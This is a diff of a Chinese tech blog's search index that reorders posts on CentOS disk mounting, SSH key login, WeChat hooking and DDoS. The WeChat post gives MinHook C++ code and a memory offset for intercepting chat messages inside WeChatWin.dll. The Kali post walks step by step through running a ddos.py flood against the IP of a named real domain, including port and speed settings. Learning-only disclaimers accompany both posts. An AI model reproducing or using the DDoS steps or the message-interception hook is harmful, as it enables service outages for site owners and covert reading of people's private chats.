@@ -57,6 +57,71 @@
       </tags>
   </entry>
   <entry>
+    <title>CentOS 7 查找挂载新数据盘并设置开机自启动挂载</title>
+    <url>/2023/01/26/CentOS7%E6%9F%A5%E6%89%BE%E6%8C%82%E8%BD%BD%E6%96%B0%E6%95%B0%E6%8D%AE%E7%9B%98%E5%B9%B6%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8C%82%E8%BD%BD/</url>
+    <content><![CDATA[<h2 id="查看磁盘信息"><a href="#查看磁盘信息" class="headerlink" title="查看磁盘信息"></a>查看磁盘信息</h2><p>使用<code>df -TH</code>指令查看当前系统挂载的磁盘信息：</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202301262350581.png" alt="img"></p>
+<p>使用<code>fdisk -l</code>指令查看服务器上的硬盘情况：</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202301262350602.png" alt="img"></p>
+<p>可以看到出现了路径为<code>/dev/sda</code>的274.9 GB硬盘存在。</p>
+<h2 id="挂载硬盘"><a href="#挂载硬盘" class="headerlink" title="挂载硬盘"></a>挂载硬盘</h2><p>执行命令<code>fdisk /dev/sda</code>，进入<code>fdisk</code>模式，开始对新增数据盘执行分区操作：</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202301262350828.png" alt="img"></p>
+<p>在<code>Command (m for help): </code>的回传信息中输入<code>n</code>后回车，在接下来的引导指令中直接回车使用默认配置，当回传信息显示硬盘分区创建好后，输入<code>p</code>来查看新建分区的详细信息，确认无误后输入<code>w</code>将配置进行保存。</p>
+<p>然后执行命令<code>partprobe</code>将新的数据盘分区表变更同步到系统中。</p>
+<p>接着执行命令<code>mkfs -t ext4 /dev/sda1</code>将创建好的数据盘文件系统设置为所需格式：</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202301262350544.png" alt="img"></p>
+<p>一路回车使用默认配置即可。</p>
+<p>执行依次以下指令，将创建好的数据盘分区挂载到指定文件目录下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 新建一个名为 datadisk 的文件夹</span></span><br><span class="line"><span class="built_in">mkdir</span> /mnt/datadisk</span><br><span class="line"><span class="comment"># 将数据盘挂载到这个文件夹路径下</span></span><br><span class="line">mount /dev/sda1 /mnt/datadisk</span><br></pre></td></tr></table></figure>
+
+<p>然后执行<code>df -TH</code>命令查看数据盘挂载情况：</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202301262350988.png" alt="img"></p>
+<p>如图所示，挂载成功。</p>
+<h2 id="设置开机启动自动挂载"><a href="#设置开机启动自动挂载" class="headerlink" title="设置开机启动自动挂载"></a>设置开机启动自动挂载</h2><p>为了以后方便使用，还需要设置开机自动挂载数据盘，这里使用<code>UUID</code>的配置方式实现结果：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看数据盘分区的 UUID</span></span><br><span class="line">blkid /dev/sda1</span><br><span class="line"><span class="comment"># 将回传显示的 UUID 结果记录下来，编辑 fstab 配置</span></span><br><span class="line">vi /etc/fstab</span><br></pre></td></tr></table></figure>
+
+<p>在<code>/etc/fstab</code>的文件末尾增加一行，写入以下信息并保存：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">UUID=xxxx-xxx-xxx-xxx-xxxx /mnt/datadisk ext4 defaults 1 1 </span><br></pre></td></tr></table></figure>
+
+<p>这样开机启动后自动挂载数据盘的设置就完成了，重启系统查看配置结果：</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202301262350390.png" alt="img"></p>
+<p>以上。</p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>Centos7</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HOOK微信获取聊天消息</title>
+    <url>/2022/09/21/HOOK%E5%BE%AE%E4%BF%A1%E8%8E%B7%E5%8F%96%E8%81%8A%E5%A4%A9%E6%B6%88%E6%81%AF/</url>
+    <content><![CDATA[<blockquote>
+<div class="wp-block-argon-admonition admonition shadow-sm" style="border-left-color:#660000"><div class="admonition-title" style="background-color:#dd0000"><span>警告</span></div><div class="admonition-body"><font color=red>网络不是法外之地，本篇文章仅供技术交流，相关具体实现过程我将省略！</font></div></div>
+</blockquote>
+<h2 id="获取微信处理消息的函数"><a href="#获取微信处理消息的函数" class="headerlink" title="获取微信处理消息的函数"></a>获取微信处理消息的函数</h2><p>我们可以反复向通过CE搜索消息，获取消息所在的内存地址，然后下硬件写入断点，在栈里找到相关函数，这里你可以自行按上面方法进行搜索。</p>
+<span id="more"></span>
+
+<h2 id="使用MinHook-hook该消息函数"><a href="#使用MinHook-hook该消息函数" class="headerlink" title="使用MinHook hook该消息函数"></a>使用MinHook hook该消息函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Initialize MinHook.</span><br><span class="line">if (MH_Initialize() != MH_OK)</span><br><span class="line">&#123;</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br><span class="line">DWORD windllAddress = (DWORD)GetModuleHandle(L&quot;WeChatWin.dll&quot;);</span><br><span class="line">if (windllAddress == 0) &#123;</span><br><span class="line">printf(&quot;Module Address Get Error: 0x%x\n&quot;, windllAddress);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">DWORD ReceiveHookAddress = windllAddress + 0x*****; // 偏移地址请查看下方</span><br><span class="line"> </span><br><span class="line">// Create a hook for MessageBoxW, in disabled state.</span><br><span class="line">if (MH_CreateHook((LPVOID)ReceiveHookAddress, &amp;ReceiveWxMessage,</span><br><span class="line">reinterpret_cast&lt;LPVOID*&gt;(&amp;_receiveMsgFunc)) != MH_OK)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;MH_CreateHook Error: 0x%x\n&quot;, ReceiveHookAddress);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h2 id="消息Hook函数"><a href="#消息Hook函数" class="headerlink" title="消息Hook函数"></a>消息Hook函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">void ReceiveWxMessage(DWORD r_eax)</span><br><span class="line">&#123;</span><br><span class="line">try</span><br><span class="line">&#123;</span><br><span class="line">// 检查进程是否有权限访问指定的内存块</span><br><span class="line">if (IsBadReadPtr((void*)r_eax, 4)</span><br><span class="line">|| IsBadReadPtr((void*)(r_eax + MsgTypeOffset), 4)</span><br><span class="line">|| IsBadReadPtr((void*)(r_eax + MsgContentOffset), 4)</span><br><span class="line">|| IsBadReadPtr((void*)(r_eax + WxidOffset), 4)</span><br><span class="line">|| IsBadReadPtr((void*)(r_eax + GroupMsgSenderOffset), 4)</span><br><span class="line">|| IsBadReadPtr((void*)(r_eax + MsgSourceOffset), 4)</span><br><span class="line">) &#123;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">// 取出消息内容</span><br><span class="line">LPVOID pContent = *((LPVOID*)(r_eax + MsgContentOffset));</span><br><span class="line"> </span><br><span class="line">// 取出微信ID/群ID</span><br><span class="line">LPVOID pWxid = *((LPVOID*)(r_eax + WxidOffset));</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if (!wcscmp((wchar_t*)pWxid, L&quot;filehelper&quot;)) &#123;</span><br><span class="line">wprintf(L&quot;Receive Msg\n Wechat ID: %ws \n Content: %ws\n&quot;, (wchar_t*)pWxid, (wchar_t*)pContent);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">catch (...)</span><br><span class="line">&#123;</span><br><span class="line">OutputDebugStringA(&quot;消息异常&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h2 id="Hook效果"><a href="#Hook效果" class="headerlink" title="Hook效果"></a>Hook效果</h2><p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210322614.png"></p>
+<blockquote>
+<p>接收函数具体地址：windllAddress + 0x1086F0;</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>微信</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Centos7安装时引导错误以及解决方案</title>
     <url>/2019/11/19/Centos7%E5%AE%89%E8%A3%85%E6%97%B6%E5%BC%95%E5%AF%BC%E9%94%99%E8%AF%AF%E4%BB%A5%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
     <content><![CDATA[<p>Centos7安装时引导错误以及解决方案<br>使用U盘刻录方式安装CentOS7.6，但是发现安装初始化时候发生错误，本以为是U盘刻录或者是镜像的问题，但是反复刻录多遍仍然出错。后来在CentOS中文社区，发现使用UltraISO刻录安装时就可能出现初始化引导错误1.一般情况下</p>
@@ -87,31 +152,6 @@
 ]]></content>
       <tags>
         <tag>Centos7</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HOOK微信获取聊天消息</title>
-    <url>/2022/09/21/HOOK%E5%BE%AE%E4%BF%A1%E8%8E%B7%E5%8F%96%E8%81%8A%E5%A4%A9%E6%B6%88%E6%81%AF/</url>
-    <content><![CDATA[<blockquote>
-<div class="wp-block-argon-admonition admonition shadow-sm" style="border-left-color:#660000"><div class="admonition-title" style="background-color:#dd0000"><span>警告</span></div><div class="admonition-body"><font color=red>网络不是法外之地，本篇文章仅供技术交流，相关具体实现过程我将省略！</font></div></div>
-</blockquote>
-<h2 id="获取微信处理消息的函数"><a href="#获取微信处理消息的函数" class="headerlink" title="获取微信处理消息的函数"></a>获取微信处理消息的函数</h2><p>我们可以反复向通过CE搜索消息，获取消息所在的内存地址，然后下硬件写入断点，在栈里找到相关函数，这里你可以自行按上面方法进行搜索。</p>
-<span id="more"></span>
-
-<h2 id="使用MinHook-hook该消息函数"><a href="#使用MinHook-hook该消息函数" class="headerlink" title="使用MinHook hook该消息函数"></a>使用MinHook hook该消息函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Initialize MinHook.</span><br><span class="line">if (MH_Initialize() != MH_OK)</span><br><span class="line">&#123;</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br><span class="line">DWORD windllAddress = (DWORD)GetModuleHandle(L&quot;WeChatWin.dll&quot;);</span><br><span class="line">if (windllAddress == 0) &#123;</span><br><span class="line">printf(&quot;Module Address Get Error: 0x%x\n&quot;, windllAddress);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">DWORD ReceiveHookAddress = windllAddress + 0x*****; // 偏移地址请查看下方</span><br><span class="line"> </span><br><span class="line">// Create a hook for MessageBoxW, in disabled state.</span><br><span class="line">if (MH_CreateHook((LPVOID)ReceiveHookAddress, &amp;ReceiveWxMessage,</span><br><span class="line">reinterpret_cast&lt;LPVOID*&gt;(&amp;_receiveMsgFunc)) != MH_OK)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;MH_CreateHook Error: 0x%x\n&quot;, ReceiveHookAddress);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<h2 id="消息Hook函数"><a href="#消息Hook函数" class="headerlink" title="消息Hook函数"></a>消息Hook函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">void ReceiveWxMessage(DWORD r_eax)</span><br><span class="line">&#123;</span><br><span class="line">try</span><br><span class="line">&#123;</span><br><span class="line">// 检查进程是否有权限访问指定的内存块</span><br><span class="line">if (IsBadReadPtr((void*)r_eax, 4)</span><br><span class="line">|| IsBadReadPtr((void*)(r_eax + MsgTypeOffset), 4)</span><br><span class="line">|| IsBadReadPtr((void*)(r_eax + MsgContentOffset), 4)</span><br><span class="line">|| IsBadReadPtr((void*)(r_eax + WxidOffset), 4)</span><br><span class="line">|| IsBadReadPtr((void*)(r_eax + GroupMsgSenderOffset), 4)</span><br><span class="line">|| IsBadReadPtr((void*)(r_eax + MsgSourceOffset), 4)</span><br><span class="line">) &#123;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">// 取出消息内容</span><br><span class="line">LPVOID pContent = *((LPVOID*)(r_eax + MsgContentOffset));</span><br><span class="line"> </span><br><span class="line">// 取出微信ID/群ID</span><br><span class="line">LPVOID pWxid = *((LPVOID*)(r_eax + WxidOffset));</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if (!wcscmp((wchar_t*)pWxid, L&quot;filehelper&quot;)) &#123;</span><br><span class="line">wprintf(L&quot;Receive Msg\n Wechat ID: %ws \n Content: %ws\n&quot;, (wchar_t*)pWxid, (wchar_t*)pContent);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">catch (...)</span><br><span class="line">&#123;</span><br><span class="line">OutputDebugStringA(&quot;消息异常&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<h2 id="Hook效果"><a href="#Hook效果" class="headerlink" title="Hook效果"></a>Hook效果</h2><p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210322614.png"></p>
-<blockquote>
-<p>接收函数具体地址：windllAddress + 0x1086F0;</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>技术</category>
-      </categories>
-      <tags>
-        <tag>微信</tag>
       </tags>
   </entry>
   <entry>
@@ -262,6 +302,38 @@
       </tags>
   </entry>
   <entry>
+    <title>Kali的DDoS攻击方法</title>
+    <url>/2022/09/21/Kali%E7%9A%84DDoS%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212049992.jpeg"></p>
+<p><strong>本文章使用的是Kali Linux的2021-4-installer-amd64版本，Kali Linux的安装过程本文章不做过多说明(博主之前做过一篇如何破解WIFI密码，不会的可自行查阅)，请自行百度本帖子如果涉及侵权请联系我</strong></p>
+<span id="more"></span>
+
+<p>1**.**首先，打开一个终端然后<code>su root</code>进入<code>root</code></p>
+<p>  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212050035.png" alt="img">  </p>
+<p>2.下载ddos文件包  </p>
+<p>自行百度下载</p>
+<p>3.cd到ddos包下</p>
+<p>  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212050053.png" alt="img"> </p>
+<p> 4.用python执行<code>ddos.py</code>，输入命令：<code>python ddos.py</code></p>
+<p>  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212056870.png" alt="img">  </p>
+<p>5.再打开一个终端输入命令:<code> ping www.siediyer.cn</code>  即可获得攻击对象的IP地址。（获取IP后<code>Ctrl+C</code>可以结束<code>ping</code>）   <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212055245.png" alt="img">  </p>
+<p>6.然后回到刚刚的终端，输入<code>ping</code>到的IP地址：</p>
+<p>  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212056852.png" alt="img"></p>
+<p>  7.Attack Port即攻击端口，一般服务器默认为80（更多内容请百度）  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212056029.png" alt="img"> </p>
+<p> 8.Attack Speed即攻击速度，数值越大越快，最大不能超过1000  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212056295.png" alt="img">  </p>
+<p>9.按下回车，如果出现以下界面，即代表已经开始向该IP发起DDos攻击，也就成功了。  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212056196.png" alt="img">   </p>
+<p>安全无边疆，努力习知识  </p>
+<p>本文章只供学习交流学习不可用于其他非法用途！！！</p>
+<p> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212056473.png" alt="9"></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>Kali</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux中的挂载命令mount</title>
     <url>/2022/09/21/Linux%E4%B8%AD%E7%9A%84%E6%8C%82%E8%BD%BD%E5%91%BD%E4%BB%A4mount/</url>
     <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在 Linux GUI 中，我们通常理所当然地认为，当我们插入 USB 闪存驱动器、硬盘驱动器甚至 DVD 磁盘时，它们就可以使用了。但是在后台有一个过程，设备被安装（准备好使用）并分配了一个安装点。当使用服务器或远程连接时，并不能确定某个设备是否会自动可用，那么我们如何挂载自己的设备呢？下面我们一起来看一下！</p>
@@ -345,38 +417,6 @@
       </categories>
       <tags>
         <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Kali的DDoS攻击方法</title>
-    <url>/2022/09/21/Kali%E7%9A%84DDoS%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</url>
-    <content><![CDATA[<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212049992.jpeg"></p>
-<p><strong>本文章使用的是Kali Linux的2021-4-installer-amd64版本，Kali Linux的安装过程本文章不做过多说明(博主之前做过一篇如何破解WIFI密码，不会的可自行查阅)，请自行百度本帖子如果涉及侵权请联系我</strong></p>
-<span id="more"></span>
-
-<p>1**.**首先，打开一个终端然后<code>su root</code>进入<code>root</code></p>
-<p>  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212050035.png" alt="img">  </p>
-<p>2.下载ddos文件包  </p>
-<p>自行百度下载</p>
-<p>3.cd到ddos包下</p>
-<p>  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212050053.png" alt="img"> </p>
-<p> 4.用python执行<code>ddos.py</code>，输入命令：<code>python ddos.py</code></p>
-<p>  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212056870.png" alt="img">  </p>
-<p>5.再打开一个终端输入命令:<code> ping www.siediyer.cn</code>  即可获得攻击对象的IP地址。（获取IP后<code>Ctrl+C</code>可以结束<code>ping</code>）   <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212055245.png" alt="img">  </p>
-<p>6.然后回到刚刚的终端，输入<code>ping</code>到的IP地址：</p>
-<p>  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212056852.png" alt="img"></p>
-<p>  7.Attack Port即攻击端口，一般服务器默认为80（更多内容请百度）  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212056029.png" alt="img"> </p>
-<p> 8.Attack Speed即攻击速度，数值越大越快，最大不能超过1000  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212056295.png" alt="img">  </p>
-<p>9.按下回车，如果出现以下界面，即代表已经开始向该IP发起DDos攻击，也就成功了。  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212056196.png" alt="img">   </p>
-<p>安全无边疆，努力习知识  </p>
-<p>本文章只供学习交流学习不可用于其他非法用途！！！</p>
-<p> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212056473.png" alt="9"></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-      </categories>
-      <tags>
-        <tag>Kali</tag>
       </tags>
   </entry>
   <entry>
@@ -632,6 +672,42 @@
       </tags>
   </entry>
   <entry>
+    <title>Linux通过密钥对免密登录</title>
+    <url>/2022/09/21/Linux%E9%80%9A%E8%BF%87%E5%AF%86%E9%92%A5%E5%AF%B9%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95/</url>
+    <content><![CDATA[<p>首先，说明一下我们要做的是，跳板机服务器的<code>usera</code>用户免密码登录B服务器的<code>userb</code>用户。<br>我们先使用<code>usera</code>登录跳板服务器</p>
+<blockquote>
+<p>首先生成密钥对如果有则跳过这一步</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<p>操作演示</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[sera@serverA ~]$ ssh-keygen -t rsa  <span class="comment">//使用rsa算法加密</span></span><br><span class="line"><span class="title class_">Generating</span> public/private rsa key pair.</span><br><span class="line"><span class="title class_">Enter</span> file <span class="keyword">in</span> which to save the key (<span class="regexp">/home/u</span>sera/.<span class="property">ssh</span>/id_rsa): <span class="comment">//私钥默认保存路径</span></span><br><span class="line"><span class="title class_">Created</span> directory <span class="string">&#x27;/home/usera/.ssh&#x27;</span>.</span><br><span class="line"><span class="title class_">Enter</span> passphrase (empty <span class="keyword">for</span> no passphrase): <span class="comment">//在这里输入密码如果这里输入密码以后登录需要密钥和密码才能登录这里建议直接回车也就是空</span></span><br><span class="line"><span class="title class_">Enter</span> same passphrase <span class="attr">again</span>:</span><br><span class="line"><span class="title class_">Your</span> identification has been saved <span class="keyword">in</span> /home/usera/.<span class="property">ssh</span>/id_rsa.</span><br><span class="line"><span class="title class_">Your</span> public key has been saved <span class="keyword">in</span> /home/usera/.<span class="property">ssh</span>/id_rsa.<span class="property">pub</span>. <span class="comment">//公钥保存路径</span></span><br><span class="line"><span class="title class_">The</span> key fingerprint <span class="attr">is</span>:</span><br><span class="line"><span class="number">39</span>:<span class="attr">f2</span>:<span class="attr">fc</span>:<span class="number">70</span>:<span class="attr">ef</span>:<span class="attr">e9</span>:<span class="attr">bd</span>:<span class="number">05</span>:<span class="number">40</span>:6<span class="attr">e</span>:<span class="number">64</span>:<span class="attr">b0</span>:<span class="number">99</span>:<span class="number">56</span>:6<span class="attr">e</span>:<span class="number">01</span> usera@serverA</span><br><span class="line"><span class="title class_">The</span> key<span class="string">&#x27;s randomart image is:</span></span><br><span class="line"><span class="string">+--[ RSA 2048]----+</span></span><br><span class="line"><span class="string">| Eo* |</span></span><br><span class="line"><span class="string">| @ . |</span></span><br><span class="line"><span class="string">| = * |</span></span><br><span class="line"><span class="string">| o o . |</span></span><br><span class="line"><span class="string">| . S . |</span></span><br><span class="line"><span class="string">| + . . |</span></span><br><span class="line"><span class="string">| + . .|</span></span><br><span class="line"><span class="string">| + . o . |</span></span><br><span class="line"><span class="string">| .o= o. |</span></span><br><span class="line"><span class="string">+-----------------+</span></span><br></pre></td></tr></table></figure>
+
+<p>以下是截图提示</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210216196.png"></p>
+<blockquote>
+<p>id_rsa是私钥，id_rsa.pub是公钥公钥在服务器私钥在自己手上</p>
+</blockquote>
+<p>此时会在<code>/home/usera/.ssh</code>目录下生成密钥对我们使用<code>ls</code>查看一下</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">root@<span class="attr">vultr</span>:~#  ls -la .<span class="property">ssh</span></span><br><span class="line">total <span class="number">16</span></span><br><span class="line">drwx------ <span class="number">2</span> root root <span class="number">4096</span> <span class="title class_">Mar</span> <span class="number">26</span> <span class="number">18</span>:<span class="number">01</span> .</span><br><span class="line">drwx------ <span class="number">5</span> root root <span class="number">4096</span> <span class="title class_">Mar</span> <span class="number">26</span> <span class="number">18</span>:<span class="number">00</span> ..</span><br><span class="line">-rw------- <span class="number">1</span> root root <span class="number">1675</span> <span class="title class_">Mar</span> <span class="number">26</span> <span class="number">18</span>:<span class="number">01</span> id_rsa</span><br><span class="line">-rw-r--r-- <span class="number">1</span> root root  <span class="number">398</span> <span class="title class_">Mar</span> <span class="number">26</span> <span class="number">18</span>:<span class="number">01</span> id_rsa.<span class="property">pub</span></span><br></pre></td></tr></table></figure>
+
+<p>然后将公钥上传到需要登录的服务器，并以<code>userb</code>用户登录<br>至于上传方式可以用<code>scp</code>以及<code>sz</code>命令这里就介绍了<br>可以参考这篇<a href="https://shagain.club/index.php/archives/111/">文章</a></p>
+<blockquote>
+<p>上传到用户目录下的.ssh文件夹下<code>authorized_keys</code>这个文件是用来存放公钥内容的我们使用<code>cat</code>把公钥追加到<code>authorized_keys</code>这个文件就好了</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">cat id_rsa.<span class="property">pub</span> &gt;&gt; ~<span class="regexp">/.ssh/</span>authorized_keys    <span class="comment">//cat 公钥路径 &gt;&gt; ~/.ssh/authorized_keys</span></span><br></pre></td></tr></table></figure>
+
+<p>这样子我们就配置好了<br>另外我们要注意，<code>.ssh</code>目录的权限为<code>700</code>，其下文件<code>authorized_keys</code>和私钥的权限为<code>600</code>。否则会因为权限问题导致无法免密码登录。我们可以看到登陆后会有<code>known_hosts</code>文件生成。</p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Motrix是一款开源免费且界面非常清爽简约的全能型下载软件</title>
     <url>/2022/11/11/Motrix%E6%98%AF%E4%B8%80%E6%AC%BE%E5%BC%80%E6%BA%90%E5%85%8D%E8%B4%B9%E4%B8%94%E7%95%8C%E9%9D%A2%E9%9D%9E%E5%B8%B8%E6%B8%85%E7%88%BD%E7%AE%80%E7%BA%A6%E7%9A%84%E5%85%A8%E8%83%BD%E5%9E%8B%E4%B8%8B%E8%BD%BD%E8%BD%AF%E4%BB%B6/</url>
     <content><![CDATA[<p><a href="https://motrix.app/">下载</a>软件有很多选择，网上就介绍过IDM、Folx、Photon、FDM、迅雷等等，一数一大堆。不过正所谓各花入个眼，还是有很多人想寻找不一样的下载工具。</p>
@@ -673,42 +749,6 @@
       <tags>
         <tag>下载</tag>
         <tag>工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux通过密钥对免密登录</title>
-    <url>/2022/09/21/Linux%E9%80%9A%E8%BF%87%E5%AF%86%E9%92%A5%E5%AF%B9%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95/</url>
-    <content><![CDATA[<p>首先，说明一下我们要做的是，跳板机服务器的<code>usera</code>用户免密码登录B服务器的<code>userb</code>用户。<br>我们先使用<code>usera</code>登录跳板服务器</p>
-<blockquote>
-<p>首先生成密钥对如果有则跳过这一步</p>
-</blockquote>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<p>操作演示</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[sera@serverA ~]$ ssh-keygen -t rsa  <span class="comment">//使用rsa算法加密</span></span><br><span class="line"><span class="title class_">Generating</span> public/private rsa key pair.</span><br><span class="line"><span class="title class_">Enter</span> file <span class="keyword">in</span> which to save the key (<span class="regexp">/home/u</span>sera/.<span class="property">ssh</span>/id_rsa): <span class="comment">//私钥默认保存路径</span></span><br><span class="line"><span class="title class_">Created</span> directory <span class="string">&#x27;/home/usera/.ssh&#x27;</span>.</span><br><span class="line"><span class="title class_">Enter</span> passphrase (empty <span class="keyword">for</span> no passphrase): <span class="comment">//在这里输入密码如果这里输入密码以后登录需要密钥和密码才能登录这里建议直接回车也就是空</span></span><br><span class="line"><span class="title class_">Enter</span> same passphrase <span class="attr">again</span>:</span><br><span class="line"><span class="title class_">Your</span> identification has been saved <span class="keyword">in</span> /home/usera/.<span class="property">ssh</span>/id_rsa.</span><br><span class="line"><span class="title class_">Your</span> public key has been saved <span class="keyword">in</span> /home/usera/.<span class="property">ssh</span>/id_rsa.<span class="property">pub</span>. <span class="comment">//公钥保存路径</span></span><br><span class="line"><span class="title class_">The</span> key fingerprint <span class="attr">is</span>:</span><br><span class="line"><span class="number">39</span>:<span class="attr">f2</span>:<span class="attr">fc</span>:<span class="number">70</span>:<span class="attr">ef</span>:<span class="attr">e9</span>:<span class="attr">bd</span>:<span class="number">05</span>:<span class="number">40</span>:6<span class="attr">e</span>:<span class="number">64</span>:<span class="attr">b0</span>:<span class="number">99</span>:<span class="number">56</span>:6<span class="attr">e</span>:<span class="number">01</span> usera@serverA</span><br><span class="line"><span class="title class_">The</span> key<span class="string">&#x27;s randomart image is:</span></span><br><span class="line"><span class="string">+--[ RSA 2048]----+</span></span><br><span class="line"><span class="string">| Eo* |</span></span><br><span class="line"><span class="string">| @ . |</span></span><br><span class="line"><span class="string">| = * |</span></span><br><span class="line"><span class="string">| o o . |</span></span><br><span class="line"><span class="string">| . S . |</span></span><br><span class="line"><span class="string">| + . . |</span></span><br><span class="line"><span class="string">| + . .|</span></span><br><span class="line"><span class="string">| + . o . |</span></span><br><span class="line"><span class="string">| .o= o. |</span></span><br><span class="line"><span class="string">+-----------------+</span></span><br></pre></td></tr></table></figure>
-
-<p>以下是截图提示</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210216196.png"></p>
-<blockquote>
-<p>id_rsa是私钥，id_rsa.pub是公钥公钥在服务器私钥在自己手上</p>
-</blockquote>
-<p>此时会在<code>/home/usera/.ssh</code>目录下生成密钥对我们使用<code>ls</code>查看一下</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">root@<span class="attr">vultr</span>:~#  ls -la .<span class="property">ssh</span></span><br><span class="line">total <span class="number">16</span></span><br><span class="line">drwx------ <span class="number">2</span> root root <span class="number">4096</span> <span class="title class_">Mar</span> <span class="number">26</span> <span class="number">18</span>:<span class="number">01</span> .</span><br><span class="line">drwx------ <span class="number">5</span> root root <span class="number">4096</span> <span class="title class_">Mar</span> <span class="number">26</span> <span class="number">18</span>:<span class="number">00</span> ..</span><br><span class="line">-rw------- <span class="number">1</span> root root <span class="number">1675</span> <span class="title class_">Mar</span> <span class="number">26</span> <span class="number">18</span>:<span class="number">01</span> id_rsa</span><br><span class="line">-rw-r--r-- <span class="number">1</span> root root  <span 